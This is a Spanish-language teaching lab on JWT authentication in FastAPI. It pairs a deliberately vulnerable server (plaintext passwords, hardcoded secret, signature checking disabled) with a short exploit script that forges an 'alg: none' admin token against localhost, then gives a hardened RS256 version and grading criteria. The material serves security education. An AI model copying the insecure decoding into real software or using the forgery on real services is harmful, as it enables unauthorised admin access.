# Autenticación robusta y responsabilidad en la práctica

---

# Código vulnerable (FastAPI)

Guarda como `vulnerable_auth.py`

```python
# vulnerable_auth.py
from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
import jwt
from typing import Optional

app = FastAPI()

USERS = {
    "alice@example.com": {"password": "password123", "role": "user"},
    "admin@example.com": {"password": "adminpass", "role": "admin"},
}

JWT_SECRET = "supersecret"
JWT_ALGORITHM = "HS256"

class LoginIn(BaseModel):
    email: str
    password: str

@app.post("/login")
def login(data: LoginIn):
    user = USERS.get(data.email)
    if not user or user["password"] != data.password:
        raise HTTPException(status_code=401, detail="Credenciales inválidas")
    
    token = jwt.encode({"sub": data.email, "role": user["role"]}, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return {"access_token": token, "token_type": "bearer"}

def insecure_decode_token(token: str):
    payload = jwt.decode(token, options={"verify_signature": False})
    return payload

@app.get("/admin")
def admin_panel(authorization: Optional[str] = Header(None)):
    if not authorization:
        raise HTTPException(401, "Missing token")
    
    token = authorization.split(" ")[1]
    payload = insecure_decode_token(token)
    
    if payload.get("role") != "admin":
        raise HTTPException(403, "Forbidden")
    return {"secret": "sólo admins pueden ver esto"}
```

**Ejecutar**:

```bash
pip install fastapi uvicorn pyjwt
uvicorn vulnerable_auth:app --reload --port 8000
```

**Por qué es vulnerable (resumen)**:

* `USERS` almacena contraseñas en texto plano.
* `JWT_SECRET` embebido en código.
* `jwt.decode(..., options={"verify_signature": False})` : desactiva verificación de firma; permite tokens forjados (por ejemplo, cambiar `role` a `admin`).
* No hay `exp`, `iss`, `aud`, ni revocación.

---

# C — Script de explotación

Este script muestra cómo **forjar** un token (o modificar header `alg: none`) y acceder al endpoint vulnerable.

Guarda como `exploit_forge.py`:

```python
import requests
import jwt

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "attacker@example.com", "role": "admin"}
unsigned_token = jwt.encode(payload, key=None, algorithm=None, headers=header)

print("Token forjado (alg none):", unsigned_token)

resp = requests.get("http://127.0.0.1:8000/admin", headers={"Authorization": f"Bearer {unsigned_token}"})
print("Status:", resp.status_code)
print("Body:", resp.text)
```

Ejecuta:

```bash
pip install requests pyjwt
python exploit_forge.py
```

En el servidor vulnerable verás acceso permitido (status 200) — **demostración del impacto**.

---

# D — Código corregido y buenas prácticas (FastAPI)

Principios aplicados:

* Hash de contraseñas (passlib / bcrypt).
* JWT firmado con **RS256** (clave privada para firmar, pública para verificar). Esto evita ataques por `alg` swapping y aceptar `none`.
* Claims: `exp`, `iss`, `aud`, `sub`.
* Verificación estricta: Verificar firma, exp, aud, iss.
* Refresh token corto/long y *logout* mediante blacklist (simple in-memory demo).
* MFA con TOTP (pyotp) como ejemplo optativo.

## 1) Generar par de claves RSA (una vez, local)

```bash
# Generar private key
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
# Generar public key
openssl rsa -in private.pem -pubout -out public.pem
```

## 2) Código seguro: `secure_auth.py`

```python
# secure_auth.py
from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from passlib.context import CryptContext
from jose import jwt, JWTError
from datetime import datetime, timedelta
from typing import Optional

app = FastAPI()

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

USERS = {
    "alice@example.com": {"password": pwd_context.hash("password123"), "role": "user"},
    "admin@example.com": {"password": pwd_context.hash("adminpass"), "role": "admin"},
}

with open("private.pem", "rb") as f:
    PRIVATE_KEY = f.read()
with open("public.pem", "rb") as f:
    PUBLIC_KEY = f.read()

ISS = "mi-curso-ucc"
AUD = "ucc-client"
ACCESS_TOKEN_EXPIRE_MINUTES = 15
REFRESH_TOKEN_EXPIRE_DAYS = 7

BLACKLIST = set()

class LoginIn(BaseModel):
    email: str
    password: str
    totp: Optional[str] = None

def verify_password(plain, hashed):
    return pwd_context.verify(plain, hashed)

def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    now = datetime.utcnow()
    if expires_delta:
        expire = now + expires_delta
    else:
        expire = now + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire, "iat": now, "iss": ISS, "aud": AUD})
    encoded_jwt = jwt.encode(to_encode, PRIVATE_KEY, algorithm="RS256")
    return encoded_jwt

@app.post("/login")
def login(data: LoginIn):
    user = USERS.get(data.email)
    if not user or not verify_password(data.password, user["password"]):
        raise HTTPException(status_code=401, detail="Credenciales inválidas")
    
    payload = {"sub": data.email, "role": user["role"]}
    access_token = create_access_token(payload, expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    refresh_token = create_access_token(payload, expires_delta=timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS))
    return {"access_token": access_token, "refresh_token": refresh_token, "token_type": "bearer"}

def verify_token(token: str):
    try:
        payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"], audience=AUD, issuer=ISS)
        jti = jwt.get_unverified_claims(token).get("jti")
    except JWTError as e:
        raise HTTPException(status_code=401, detail="Token inválido")
    if token in BLACKLIST:
        raise HTTPException(status_code=401, detail="Token revocado")
    return payload

@app.get("/admin")
def admin_panel(authorization: Optional[str] = Header(None)):
    if not authorization:
        raise HTTPException(401, "Missing token")
    token = authorization.split(" ")[1]
    payload = verify_token(token)
    if payload.get("role") != "admin":
        raise HTTPException(403, "Forbidden")
    return {"secret": "sólo admins pueden ver esto (versión segura)"}

@app.post("/logout")
def logout(authorization: Optional[str] = Header(None)):
    if not authorization:
        raise HTTPException(401, "Missing token")
    token = authorization.split(" ")[1]
    BLACKLIST.add(token)
    return {"msg": "logged out"}
```

**Instalación y ejecución**:

```bash
pip install fastapi "python-jose[cryptography]" passlib "bcrypt==3.2.0" uvicorn
uvicorn secure_auth:app --reload --port 8001
```

**Notas de seguridad aplicadas**:

* `bcrypt` para hashing de contraseñas (no texto plano).
* Firmado RS256 (private key sign / public key verify) — evita `alg` swap y `none`.
* `aud` y `iss` verificados en `jwt.decode`.
* `exp` y `iat` usados.
* Revocación (BLACKLIST) para logout/demo.

---

# E — Comandos / Postman / curl para probar

1. Login vulnerable:

```bash
curl -X POST "http://127.0.0.1:8000/login" -H "Content-Type: application/json" -d '{"email":"admin@example.com","password":"adminpass"}'
```

2. Acceder admin con token forjado (vulnerable): usar script `exploit_forge.py` mostrado antes o enviar token `alg:none`.

3. Login seguro (secure_auth.py):

```bash
curl -X POST "http://127.0.0.1:8001/login" -H "Content-Type: application/json" -d '{"email":"admin@example.com","password":"adminpass"}'
```

4. Acceder admin seguro:

```bash
curl -H "Authorization: Bearer <ACCESS_TOKEN>" http://127.0.0.1:8001/admin
```

5. Logout (revocación):

```bash
curl -X POST -H "Authorization: Bearer <ACCESS_TOKEN>" http://127.0.0.1:8001/logout
```

Después de logout, el token ya no permite acceder.

---

# F — Actividades y criterios de evaluación (Saber / Ser / Hacer)

Sugerencia corta para evaluar el momento práctico (alineado con tu rúbrica institucional):

* **Saber**: conceptos de JWT (firma vs cifrado vs claims), diferencias HS256 vs RS256, qué es `alg: none`, por qué `exp` y `aud` importan. (MCQ + una pregunta de justificar elección).
* **Ser**: explicar responsabilidad ética de no publicar/compartir credenciales y de reportar vulnerabilidades, y por qué se exige MFA en aplicaciones críticas.
* **Hacer**: en equipos, reciben un repo con el código vulnerable. Deben:

  1. Reproducir la explotación (mostrar que pueden forjar token localmente).
  2. Aplicar corrección (hashing, verificar firma, añadir exp/aud/iss o migrar a RS256).
  3. Entregar evidencia: screenshots Postman / salida curl + snippet del cambio en el código (y commit en repo).
     Evalúa según criterios: corrección técnica, justificación (Saber), y conducta responsable (Ser).

---

